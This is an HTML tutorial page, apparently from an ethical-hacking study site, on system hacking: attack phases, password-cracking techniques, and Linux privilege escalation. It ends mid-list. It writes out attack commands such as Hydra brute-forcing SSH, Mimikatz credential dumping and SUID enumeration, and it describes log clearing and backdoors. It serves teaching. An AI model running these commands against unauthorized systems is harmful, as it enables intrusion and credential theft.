@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>System Hacking - Hacker's World</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn system hacking techniques for ethical hacking and penetration testing">
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Fira+Code&display=swap" rel="stylesheet">
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary: #ef4444;
+      --primary-glow: rgba(239, 68, 68, 0.3);
+      --primary-light: rgba(239, 68, 68, 0.1);
+      --dark: #0d1117;
+      --darker: #010409;
+      --card-bg: #161b22;
+      --text-primary: #c9d1d9;
+      --text-secondary: #8b949e;
+      --accent: #58a6ff;
+      --success: #00ff88;
+      --warning: #f59e0b;
+      --border: #30363d;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: var(--dark);
+      color: var(--text-primary);
+      overflow-x: hidden;
+    }
+
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: var(--darker); }
+    ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 4px; }
+
+    /* Navbar */
+    .navbar {
+      background: rgba(13, 17, 23, 0.95) !important;
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+      padding: 15px 30px; transition: all 0.3s ease;
+    }
+    .navbar.scrolled { padding: 10px 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+    .navbar-brand { font-weight: 700; font-size: 1.4rem; color: #00ff88 !important; letter-spacing: 2px; }
+    .navbar-brand i { margin-right: 8px; }
+    .nav-link { color: var(--text-primary) !important; font-weight: 400; margin: 0 8px; transition: color 0.3s ease; }
+    .nav-link:hover { color: var(--primary) !important; }
+    .dropdown-menu {
+      background: var(--card-bg); border: 1px solid var(--border); border-radius: 10px;
+      padding: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-height: 70vh; overflow-y: auto;
+    }
+    .navbar-nav .dropdown-menu { right: 0; left: auto; }
+    .dropdown-item { color: var(--text-primary); padding: 10px 15px; border-radius: 6px; transition: all 0.3s ease; font-size: 0.9rem; }
+    .dropdown-item:hover { background: var(--primary-light); color: var(--primary); transform: translateX(5px); }
+    .dropdown-item i { margin-right: 10px; color: var(--primary); }
+    .dropdown-divider { border-top-color: var(--border); }
+
+    /* Page Header */
+    .page-header {
+      padding: 120px 0 60px; text-align: center;
+      position: relative; overflow: hidden;
+    }
+    .page-header::before {
+      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background: radial-gradient(ellipse at top, rgba(239,68,68,0.06), transparent 60%),
+                  radial-gradient(ellipse at bottom right, rgba(239,68,68,0.03), transparent 60%);
+      z-index: 0;
+    }
+    .page-header .container { position: relative; z-index: 1; }
+    .page-header h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 15px; }
+    .page-header h1 span { color: var(--primary); }
+    .page-header .lead {
+      color: var(--text-secondary); max-width: 750px; margin: 0 auto 20px; line-height: 1.8; font-size: 1.05rem;
+    }
+    .breadcrumb-custom {
+      display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; flex-wrap: wrap;
+    }
+    .breadcrumb-custom a { color: var(--accent); text-decoration: none; font-size: 0.9rem; }
+    .breadcrumb-custom a:hover { color: var(--primary); }
+    .breadcrumb-custom span { color: var(--text-secondary); font-size: 0.9rem; }
+
+    /* Badges */
+    .hack-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 5px 15px; border-radius: 50px; font-size: 0.75rem;
+      font-weight: 600; letter-spacing: 1px; text-transform: uppercase;
+    }
+    .badge-critical { background: rgba(239,68,68,0.1); color: var(--primary); border: 1px solid rgba(239,68,68,0.2); }
+    .badge-high { background: rgba(245,158,11,0.1); color: var(--warning); border: 1px solid rgba(245,158,11,0.2); }
+    .badge-medium { background: rgba(168,85,247,0.1); color: #a855f7; border: 1px solid rgba(168,85,247,0.2); }
+    .badge-info { background: rgba(88,166,255,0.1); color: var(--accent); border: 1px solid rgba(88,166,255,0.2); }
+
+    /* Section */
+    .section-header { text-align: center; margin-bottom: 50px; }
+    .section-header h2 { font-size: 2rem; font-weight: 700; margin-bottom: 10px; }
+    .section-header h2 span { color: var(--primary); }
+    .section-header p { color: var(--text-secondary); max-width: 600px; margin: 0 auto; }
+    .content-section { padding: 60px 0; }
+
+    /* Info Cards */
+    .info-card {
+      background: var(--card-bg); border: 1px solid var(--border); border-radius: 15px;
+      padding: 30px; height: 100%; transition: all 0.3s ease;
+    }
+    .info-card:hover {
+      transform: translateY(-5px); border-color: rgba(239,68,68,0.3);
+      box-shadow: 0 10px 30px rgba(239,68,68,0.08);
+    }
+    .info-card-icon {
+      width: 55px; height: 55px; background: var(--primary-light);
+      border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 18px;
+    }
+    .info-card-icon i { font-size: 1.5rem; color: var(--primary); }
+    .info-card h5 { font-weight: 600; margin-bottom: 10px; font-size: 1.1rem; }
+    .info-card p { color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7; margin: 0; }
+
+    /* Phase Timeline */
+    .timeline { position: relative; padding: 20px 0; }
+    .timeline::before {
+      content: ''; position: absolute; left: 30px; top: 0; bottom: 0;
+      width: 3px; background: linear-gradient(180deg, var(--primary), var(--accent), var(--success));
+    }
+    .timeline-item {
+      display: flex; gap: 30px; margin-bottom: 40px; position: relative;
+    }
+    .timeline-dot {
+      min-width: 60px; height: 60px; background: var(--card-bg);
+      border: 3px solid var(--primary); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-weight: 700; font-size: 1.1rem; color: var(--primary);
+      position: relative; z-index: 1; flex-shrink: 0;
+    }
+    .timeline-content {
+      background: var(--card-bg); border: 1px solid var(--border);
+      border-radius: 15px; padding: 25px; flex: 1;
+      transition: all 0.3s ease;
+    }
+    .timeline-content:hover {
+      border-color: rgba(239,68,68,0.3);
+      box-shadow: 0 8px 25px rgba(239,68,68,0.08);
+    }
+    .timeline-content h5 { color: var(--primary); font-weight: 600; margin-bottom: 8px; }
+    .timeline-content p { color: var(--text-secondary); font-size: 0.9rem; line-height: 1.7; margin-bottom: 10px; }
+    .timeline-content ul { padding-left: 20px; color: var(--text-secondary); font-size: 0.9rem; }
+    .timeline-content li { margin-bottom: 6px; }
+    .timeline-content strong { color: var(--text-primary); }
+
+    /* Attack Cards */
+    .attack-card {
+      background: var(--card-bg); border: 1px solid var(--border); border-radius: 15px;
+      padding: 25px; height: 100%; transition: all 0.3s ease; position: relative; overflow: hidden;
+    }
+    .attack-card:hover {
+      border-color: rgba(239,68,68,0.4); transform: translateY(-5px);
+      box-shadow: 0 10px 25px rgba(239,68,68,0.1);
+    }
+    .attack-card::after {
+      content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 3px;
+      background: linear-gradient(90deg, var(--primary), var(--warning));
+      transform: scaleX(0); transition: transform 0.3s ease;
+    }
+    .attack-card:hover::after { transform: scaleX(1); }
+    .attack-card h6 { color: var(--primary); font-weight: 600; margin-bottom: 8px; font-size: 1rem; }
+    .attack-card p { color: var(--text-secondary); font-size: 0.85rem; line-height: 1.7; margin-bottom: 12px; }
+
+    /* Tool Command Block */
+    .tool-cmd {
+      background: var(--dark); border: 1px solid var(--border); border-radius: 8px;
+      padding: 12px 15px; display: flex; align-items: center;
+      justify-content: space-between; gap: 10px; margin-top: 10px;
+    }
+    .tool-cmd code {
+      font-family: 'Fira Code', monospace; color: var(--primary); font-size: 0.85rem; flex: 1;
+    }
+    .tool-cmd .copy-btn {
+      background: none; border: 1px solid var(--border); border-radius: 5px;
+      color: var(--text-secondary); padding: 3px 8px; cursor: pointer;
+      font-size: 0.75rem; transition: all 0.3s ease;
+      display: flex; align-items: center; gap: 4px;
+    }
+    .tool-cmd .copy-btn:hover { border-color: var(--primary); color: var(--primary); }
+
+    /* Accordion */
+    .accordion-card {
+      background: var(--card-bg); border: 1px solid var(--border); border-radius: 15px;
+      margin-bottom: 20px; overflow: hidden; transition: all 0.3s ease;
+    }
+    .accordion-card:hover { border-color: rgba(239,68,68,0.3); }
+    .accordion-header {
+      padding: 20px 25px; cursor: pointer;
+      display: flex; align-items: center; justify-content: space-between;
+      background: none; border: none; width: 100%;
+      text-align: left; color: var(--text-primary); transition: background 0.3s ease;
+    }
+    .accordion-header:hover { background: rgba(239,68,68,0.03); }
+    .accordion-header-left { display: flex; align-items: center; gap: 15px; }
+    .accordion-icon {
+      width: 45px; height: 45px; background: var(--primary-light);
+      border-radius: 10px; display: flex; align-items: center; justify-content: center;
+    }
+    .accordion-icon i { font-size: 1.3rem; color: var(--primary); }
+    .accordion-title { font-weight: 600; font-size: 1.05rem; }
+    .accordion-subtitle { font-size: 0.8rem; color: var(--text-secondary); }
+    .accordion-arrow { color: var(--text-secondary); transition: transform 0.3s ease; }
+    .accordion-arrow.rotated { transform: rotate(180deg); }
+    .accordion-body {
+      border-top: 1px solid var(--border); padding: 25px; display: none;
+      color: var(--text-secondary); line-height: 1.9; font-size: 0.95rem;
+    }
+    .accordion-body h6 { color: var(--primary); font-weight: 600; margin: 20px 0 10px; }
+    .accordion-body h6:first-child { margin-top: 0; }
+    .accordion-body ul { padding-left: 20px; }
+    .accordion-body li { margin-bottom: 8px; }
+    .accordion-body strong { color: var(--text-primary); }
+
+    /* Warning Box */
+    .warning-box {
+      background: linear-gradient(135deg, rgba(239,68,68,0.08), rgba(239,68,68,0.02));
+      border: 1px solid rgba(239,68,68,0.2); border-radius: 12px;
+      padding: 25px; margin: 30px 0; position: relative; overflow: hidden;
+    }
+    .warning-box::before {
+      content: ''; position: absolute; top: 0; left: 0;
+      width: 4px; height: 100%; background: var(--primary);
+    }
+    .warning-box h6 { color: var(--primary); font-weight: 600; margin-bottom: 8px; }
+    .warning-box h6 i { margin-right: 8px; }
+    .warning-box p { color: var(--text-secondary); font-size: 0.9rem; margin: 0; line-height: 1.7; }
+
+    /* Styled Table */
+    .styled-table {
+      width: 100%; border-collapse: separate; border-spacing: 0;
+      border-radius: 12px; overflow: hidden; margin: 20px 0;
+    }
+    .styled-table thead th {
+      background: var(--primary-light); color: var(--primary);
+      padding: 14px 18px; font-weight: 600; font-size: 0.9rem;
+      border-bottom: 2px solid var(--border);
+    }
+    .styled-table tbody td {
+      padding: 12px 18px; border-bottom: 1px solid var(--border);
+      font-size: 0.9rem; color: var(--text-secondary);
+    }
+    .styled-table tbody tr:hover { background: rgba(239,68,68,0.03); }
+    .styled-table tbody tr:last-child td { border-bottom: none; }
+
+    /* Footer */
+    .footer {
+      background: var(--darker); border-top: 1px solid var(--border); padding: 40px 0 20px;
+    }
+    .footer-content {
+      display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 15px;
+    }
+    .footer-brand { color: #00ff88; font-weight: 700; font-size: 1.2rem; letter-spacing: 2px; }
+    .footer-brand i { margin-right: 6px; }
+    .footer-links a {
+      color: var(--text-secondary); text-decoration: none; margin-left: 20px;
+      font-size: 0.9rem; transition: color 0.3s ease;
+    }
+    .footer-links a:hover { color: var(--primary); }
+    .footer-bottom {
+      text-align: center; margin-top: 20px; padding-top: 20px;
+      border-top: 1px solid var(--border);
+    }
+    .footer-bottom p { color: var(--text-secondary); font-size: 0.8rem; }
+
+    /* Back to Top */
+    .back-to-top {
+      position: fixed; bottom: 30px; right: 30px;
+      width: 45px; height: 45px; background: var(--primary); color: #fff;
+      border: none; border-radius: 50%; font-size: 1.2rem;
+      cursor: pointer; display: none; align-items: center;
+      justify-content: center; z-index: 999;
+      box-shadow: 0 4px 15px var(--primary-glow); transition: all 0.3s ease;
+    }
+    .back-to-top:hover { transform: translateY(-3px); }
+
+    /* Toast */
+    .toast-notification {
+      position: fixed; bottom: 80px; right: 30px;
+      background: var(--card-bg); border: 1px solid var(--primary);
+      color: var(--primary); padding: 12px 20px; border-radius: 10px;
+      font-size: 0.85rem; z-index: 1000; display: none;
+      box-shadow: 0 5px 20px var(--primary-glow);
+      animation: slideIn 0.3s ease;
+    }
+    @keyframes slideIn {
+      from { transform: translateX(100px); opacity: 0; }
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    @media (max-width: 768px) {
+      .page-header h1 { font-size: 2rem; }
+      .footer-content { flex-direction: column; text-align: center; }
+      .footer-links a { margin: 0 10px; }
+      .timeline::before { left: 20px; }
+      .timeline-dot { min-width: 45px; height: 45px; font-size: 0.9rem; }
+      .timeline-item { gap: 15px; }
+      .navbar-nav .dropdown-menu { right: auto; left: 0; max-height: 50vh; }
+    }
+  </style>
+</head>
+<body>
+
+<button class="back-to-top" id="backToTop"><i class="bi bi-arrow-up"></i></button>
+<div class="toast-notification" id="toast"><i class="bi bi-check-circle-fill"></i> <span id="toastMsg">Copied!</span></div>
+
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg fixed-top" id="mainNavbar">
+  <a class="navbar-brand" href="index.html"><i class="bi bi-shield-lock-fill"></i> HACKER'S WORLD</a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+  <div class="collapse navbar-collapse" id="navbarNav">
+    <ul class="navbar-nav ml-auto">
+      <li class="nav-item"><a class="nav-link" href="index.html"><i class="bi bi-house-fill"></i> Home</a></li>
+      <li class="nav-item active"><a class="nav-link" href="#"><i class="bi bi-pc-display"></i> System Hacking</a></li>
+      <li class="nav-item dropdown">
+        <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown"><i class="bi bi-grid-fill"></i> More</a>
+        <div class="dropdown-menu dropdown-menu-right">
+          <a class="dropdown-item" href="Linux_cmd.html"><i class="bi bi-terminal-fill"></i> Linux Commands</a>
+          <a class="dropdown-item" href="win-cmd.html"><i class="bi bi-windows"></i> Windows Commands</a>
+          <div class="dropdown-divider"></div>
+          <a class="dropdown-item" href="footprinting.html"><i class="bi bi-search"></i> Footprinting</a>
+          <a class="dropdown-item" href="scanning.html"><i class="bi bi-broadcast-pin"></i> Scanning</a>
+          <a class="dropdown-item" href="android-hacking.html"><i class="bi bi-phone-fill"></i> Android Hacking</a>
+          <a class="dropdown-item" href="ddos.html"><i class="bi bi-lightning-fill"></i> DDoS</a>
+          <a class="dropdown-item" href="mitm.html"><i class="bi bi-people-fill"></i> MITM</a>
+          <a class="dropdown-item" href="wifi-hacking.html"><i class="bi bi-wifi"></i> WiFi Hacking</a>
+        </div>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+<!-- Page Header -->
+<section class="page-header">
+  <div class="container">
+    <div class="breadcrumb-custom">
+      <a href="index.html"><i class="bi bi-house-fill"></i> Home</a>
+      <span>/</span>
+      <span>System Hacking</span>
+    </div>
+    <h1 data-aos="fade-up"><i class="bi bi-pc-display" style="color:var(--primary)"></i> System <span>Hacking</span></h1>
+    <p class="lead" data-aos="fade-up" data-aos-delay="100">
+      System hacking is the third phase of ethical hacking involving gaining access to systems, escalating privileges,
+      maintaining access, and covering tracks. It is one of the most critical phases in penetration testing.
+    </p>
+    <div data-aos="fade-up" data-aos-delay="200">
+      <span class="hack-badge badge-critical"><i class="bi bi-exclamation-triangle-fill"></i> Advanced</span>
+      <span class="hack-badge badge-high"><i class="bi bi-shield-exclamation"></i> Authorization Required</span>
+    </div>
+  </div>
+</section>
+
+<!-- Warning -->
+<section class="content-section" style="padding-bottom:0;">
+  <div class="container">
+    <div class="warning-box" data-aos="fade-up">
+      <h6><i class="bi bi-exclamation-triangle-fill"></i> Critical Warning</h6>
+      <p>System hacking techniques are <strong>highly sensitive</strong> and should <strong>ONLY</strong> be performed on systems you own or have explicit written authorization to test.
+        Unauthorized access to computer systems is a serious criminal offense under laws like the CFAA (US), Computer Misuse Act (UK), and IT Act (India).
+        Always obtain proper authorization and operate within the defined scope of engagement.</p>
+    </div>
+  </div>
+</section>
+
+<!-- System Hacking Phases -->
+<section class="content-section">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>System Hacking <span>Phases</span></h2>
+      <p>The four main phases of system hacking in the CEH methodology.</p>
+    </div>
+
+    <div class="row">
+      <div class="col-lg-3 col-md-6 mb-4" data-aos="fade-up">
+        <div class="info-card" style="border-top: 3px solid var(--primary);">
+          <div class="info-card-icon"><i class="bi bi-key-fill"></i></div>
+          <h5>1. Gaining Access</h5>
+          <p>Exploit vulnerabilities and crack passwords to gain initial access to the target system. Includes password attacks, exploitation, and social engineering.</p>
+        </div>
+      </div>
+      <div class="col-lg-3 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="100">
+        <div class="info-card" style="border-top: 3px solid var(--warning);">
+          <div class="info-card-icon" style="background:rgba(245,158,11,0.1);"><i class="bi bi-arrow-up-circle-fill" style="color:var(--warning);"></i></div>
+          <h5>2. Escalating Privileges</h5>
+          <p>Elevate from a low-privilege user to administrator or root level access using privilege escalation techniques and exploits.</p>
+        </div>
+      </div>
+      <div class="col-lg-3 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="200">
+        <div class="info-card" style="border-top: 3px solid #a855f7;">
+          <div class="info-card-icon" style="background:rgba(168,85,247,0.1);"><i class="bi bi-door-open-fill" style="color:#a855f7;"></i></div>
+          <h5>3. Maintaining Access</h5>
+          <p>Install backdoors, rootkits, and trojans to ensure persistent access to the compromised system even after reboots.</p>
+        </div>
+      </div>
+      <div class="col-lg-3 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="300">
+        <div class="info-card" style="border-top: 3px solid var(--accent);">
+          <div class="info-card-icon" style="background:rgba(88,166,255,0.1);"><i class="bi bi-eraser-fill" style="color:var(--accent);"></i></div>
+          <h5>4. Clearing Tracks</h5>
+          <p>Remove evidence of the intrusion by clearing logs, modifying timestamps, and disabling auditing to avoid detection.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Detailed Timeline -->
+<section class="content-section" style="padding-top:0;">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>Detailed <span>Methodology</span></h2>
+      <p>Step-by-step breakdown of system hacking techniques.</p>
+    </div>
+
+    <div class="timeline">
+      <!-- Phase 1: Gaining Access -->
+      <div class="timeline-item" data-aos="fade-up">
+        <div class="timeline-dot">1</div>
+        <div class="timeline-content">
+          <h5><i class="bi bi-key-fill"></i> Phase 1: Gaining Access</h5>
+          <p>The initial phase focuses on bypassing authentication mechanisms and gaining an initial foothold on the target system.</p>
+          <ul>
+            <li><strong>Password Cracking</strong> — Brute force, dictionary attacks, rainbow tables, and rule-based attacks</li>
+            <li><strong>Vulnerability Exploitation</strong> — Using known CVEs and exploits to gain unauthorized access</li>
+            <li><strong>Social Engineering</strong> — Phishing, pretexting, baiting to trick users into revealing credentials</li>
+            <li><strong>Default Credentials</strong> — Testing for default usernames and passwords on services</li>
+            <li><strong>Pass the Hash</strong> — Using captured NTLM hashes without cracking them</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Phase 2: Privilege Escalation -->
+      <div class="timeline-item" data-aos="fade-up" data-aos-delay="100">
+        <div class="timeline-dot" style="border-color:var(--warning);">2</div>
+        <div class="timeline-content">
+          <h5 style="color:var(--warning);"><i class="bi bi-arrow-up-circle-fill"></i> Phase 2: Privilege Escalation</h5>
+          <p>After gaining initial access, escalate to higher privilege levels to gain full control of the system.</p>
+          <ul>
+            <li><strong>Vertical Escalation</strong> — Moving from a regular user to administrator/root</li>
+            <li><strong>Horizontal Escalation</strong> — Moving to another user account at the same privilege level</li>
+            <li><strong>Kernel Exploits</strong> — Exploiting OS kernel vulnerabilities for root access</li>
+            <li><strong>Misconfigured Services</strong> — Exploiting services running with elevated privileges</li>
+            <li><strong>SUID/SGID Binaries</strong> — Abusing setuid/setgid binaries on Linux systems</li>
+            <li><strong>Unquoted Service Paths</strong> — Exploiting unquoted paths in Windows services</li>
+            <li><strong>DLL Hijacking</strong> — Replacing legitimate DLLs with malicious ones</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Phase 3: Maintaining Access -->
+      <div class="timeline-item" data-aos="fade-up" data-aos-delay="200">
+        <div class="timeline-dot" style="border-color:#a855f7;">3</div>
+        <div class="timeline-content">
+          <h5 style="color:#a855f7;"><i class="bi bi-door-open-fill"></i> Phase 3: Maintaining Access</h5>
+          <p>Establish persistent access mechanisms that survive reboots, password changes, and security updates.</p>
+          <ul>
+            <li><strong>Backdoors</strong> — Install hidden access points that bypass normal authentication</li>
+            <li><strong>Rootkits</strong> — Kernel-level or user-level tools that hide malicious activity</li>
+            <li><strong>Trojans</strong> — Disguised malware that provides remote access</li>
+            <li><strong>Web Shells</strong> — Server-side scripts providing remote command execution</li>
+            <li><strong>Scheduled Tasks</strong> — Create persistent tasks that execute malicious code</li>
+            <li><strong>Registry Modifications</strong> — Windows registry entries for persistence</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Phase 4: Clearing Tracks -->
+      <div class="timeline-item" data-aos="fade-up" data-aos-delay="300">
+        <div class="timeline-dot" style="border-color:var(--accent);">4</div>
+        <div class="timeline-content">
+          <h5 style="color:var(--accent);"><i class="bi bi-eraser-fill"></i> Phase 4: Clearing Tracks</h5>
+          <p>Remove all evidence of the intrusion to avoid detection by security teams and forensic investigators.</p>
+          <ul>
+            <li><strong>Log Manipulation</strong> — Clearing or modifying system, application, and security logs</li>
+            <li><strong>Timestamp Manipulation</strong> — Changing file creation/modification times (timestomping)</li>
+            <li><strong>Audit Trail Disabling</strong> — Disabling logging and auditing mechanisms</li>
+            <li><strong>File Hiding</strong> — Using alternate data streams (ADS) or hidden attributes</li>
+            <li><strong>Anti-Forensics</strong> — Techniques to defeat forensic analysis tools</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Password Cracking -->
+<section class="content-section" style="padding-top:0;">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>Password <span>Cracking</span></h2>
+      <p>Techniques and tools for cracking passwords.</p>
+    </div>
+
+    <!-- Types -->
+    <div class="row mb-4">
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up">
+        <div class="attack-card">
+          <h6><i class="bi bi-speedometer2"></i> Brute Force Attack</h6>
+          <p>Systematically tries every possible character combination until the correct password is found. Effective but very slow for complex passwords.</p>
+          <span class="hack-badge badge-critical">Slow but Reliable</span>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="50">
+        <div class="attack-card">
+          <h6><i class="bi bi-book-fill"></i> Dictionary Attack</h6>
+          <p>Uses a wordlist containing common passwords, phrases, and leaked credentials to attempt authentication against the target.</p>
+          <span class="hack-badge badge-high">Fast with Good Wordlist</span>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="100">
+        <div class="attack-card">
+          <h6><i class="bi bi-rainbow"></i> Rainbow Table Attack</h6>
+          <p>Uses precomputed hash-to-password lookup tables for fast cracking. Defeated by salted hashes but very effective against unsalted ones.</p>
+          <span class="hack-badge badge-medium">Precomputed</span>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="150">
+        <div class="attack-card">
+          <h6><i class="bi bi-gear-wide-connected"></i> Rule-Based Attack</h6>
+          <p>Applies transformation rules to dictionary words (capitalize, append numbers, leetspeak substitution) to generate more password candidates.</p>
+          <span class="hack-badge badge-high">Smart Mutations</span>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="200">
+        <div class="attack-card">
+          <h6><i class="bi bi-hdd-fill"></i> Pass the Hash (PtH)</h6>
+          <p>Uses captured NTLM password hashes to authenticate without knowing the plaintext password. Exploits Windows authentication protocols.</p>
+          <span class="hack-badge badge-critical">No Cracking Needed</span>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="250">
+        <div class="attack-card">
+          <h6><i class="bi bi-key-fill"></i> Credential Stuffing</h6>
+          <p>Uses previously breached username/password pairs to attempt login across multiple services, exploiting password reuse.</p>
+          <span class="hack-badge badge-high">Leverages Breaches</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tools -->
+    <div class="section-header" data-aos="fade-up">
+      <h2>Password Cracking <span>Tools</span></h2>
+      <p>Popular tools used for password recovery and cracking.</p>
+    </div>
+
+    <div class="row">
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up">
+        <div class="attack-card">
+          <h6><i class="bi bi-fire"></i> John the Ripper</h6>
+          <p>Open-source password cracker supporting multiple hash types. Supports brute force, dictionary, and rule-based attacks.</p>
+          <div class="tool-cmd">
+            <code>john --wordlist=rockyou.txt hash.txt</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="50">
+        <div class="attack-card">
+          <h6><i class="bi bi-gpu-card"></i> Hashcat</h6>
+          <p>World's fastest password recovery tool. GPU-accelerated with support for 300+ hash types and advanced attack modes.</p>
+          <div class="tool-cmd">
+            <code>hashcat -m 0 -a 0 hash.txt wordlist.txt</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="100">
+        <div class="attack-card">
+          <h6><i class="bi bi-droplet-fill"></i> Hydra</h6>
+          <p>Online password cracker supporting SSH, FTP, HTTP, RDP, SMB, MySQL, and 50+ other protocols for brute forcing.</p>
+          <div class="tool-cmd">
+            <code>hydra -l admin -P wordlist.txt ssh://target</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="150">
+        <div class="attack-card">
+          <h6><i class="bi bi-window-desktop"></i> Mimikatz</h6>
+          <p>Windows post-exploitation tool for extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory.</p>
+          <div class="tool-cmd">
+            <code>mimikatz # sekurlsa::logonpasswords</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="200">
+        <div class="attack-card">
+          <h6><i class="bi bi-terminal-fill"></i> CeWL</h6>
+          <p>Custom wordlist generator that spiders a target website and creates a tailored wordlist based on the site's content.</p>
+          <div class="tool-cmd">
+            <code>cewl -d 3 -m 5 http://target.com -w wordlist.txt</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+      <div class="col-lg-4 col-md-6 mb-4" data-aos="fade-up" data-aos-delay="250">
+        <div class="attack-card">
+          <h6><i class="bi bi-shield-fill-x"></i> Ophcrack</h6>
+          <p>Free Windows password cracker based on rainbow tables. Cracks LM and NTLM hashes with precomputed tables.</p>
+          <div class="tool-cmd">
+            <code>ophcrack</code>
+            <button class="copy-btn" onclick="copyTool(this)"><i class="bi bi-clipboard"></i></button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Privilege Escalation -->
+<section class="content-section" style="padding-top:0;">
+  <div class="container">
+    <div class="section-header" data-aos="fade-up">
+      <h2>Privilege <span>Escalation</span></h2>
+      <p>Techniques for elevating access on compromised systems.</p>
+    </div>
+
+    <!-- Linux PrivEsc -->
+    <div class="accordion-card" data-aos="fade-up">
+      <div class="accordion-header" onclick="toggleAccordion(this)">
+        <div class="accordion-header-left">
+          <div class="accordion-icon"><i class="bi bi-terminal-fill"></i></div>
+          <div>
+            <div class="accordion-title">Linux Privilege Escalation</div>
+            <div class="accordion-subtitle">Escalating to root on Linux systems</div>
+          </div>
+        </div>
+        <i class="bi bi-chevron-down accordion-arrow"></i>
+      </div>
+      <div class="accordion-body">
+        <h6>Enumeration Commands</h6>
+        <ul>
+          <li><strong>System info:</strong> <code style="color:var(--primary)">uname -a</code> , <code style="color:var(--primary)">cat /etc/os-release</code></li>
+          <li><strong>Current user:</strong> <code style="color:var(--primary)">whoami</code> , <code style="color:var(--primary)">id</code></li>
+          <li><strong>Sudo rights:</strong> <code style="color:var(--primary)">sudo -l</code></li>
+          <li><strong>SUID binaries:</strong> <code style="color:var(--primary)">find / -perm -4000 -type f 2>/dev/null</code></li>
+          <li><strong>Cron jobs:</strong> <code style="color:var(--primary)">crontab -l</code> , <code style="color:var(--primary)">cat /etc/crontab</code></li>
+          <li><strong>Writable dirs:</strong> <code style="color:var(--primary)">find / -writable -type d 2>/dev/null</code></li>
+        </ul>
+        <h6>Common Techniques</h6>
+        <ul>
+          <li><strong>Kernel exploits</strong> — Dirty COW, Dirty Pipe, PwnKit</li>
+          <li><strong>SUID abuse</strong> — GTFOBins for SUID binary exploitation</li>
+          <li><strong>Sudo misconfig</strong> — <code style="color:var(--primary)">sudo -l</code> for exploitable commands</li>
+          <li><strong>Cron job abuse</strong> — Writable cron scripts running as root</li>
+          <li><strong>PATH hijacking</strong> — Manipulating $PATH for command injection</li>
+          <li><strong>Capabilities abuse</strong> — <code style="color:var(--primary)">getcap -r / 2>/dev/null</code></li>
